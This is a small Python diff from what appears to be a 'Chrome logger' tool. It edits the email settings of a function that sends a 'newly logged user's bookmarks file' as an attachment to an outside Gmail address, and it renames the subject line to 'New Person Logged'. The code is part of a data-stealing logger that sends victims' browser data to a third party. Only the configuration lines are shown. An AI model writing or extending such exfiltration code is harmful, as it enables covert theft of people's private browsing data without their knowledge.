@@ -6,9 +6,9 @@ from email import encoders
 
 def send_email(filename, attachment):
     # Email configurations
-    sender_email = "koenslogger@example.com"
+    sender_email = "x32ware@gmail.com"
     receiver_email = "x32ware@gmail.com"
-    subject = "[CHROME LOGGER] New Logger Event"
+    subject = "New Person Logged - Bookmarks File Attached"
     body = "Attached is the newly logged user's bookmarks file."
 
     # Setup MIME
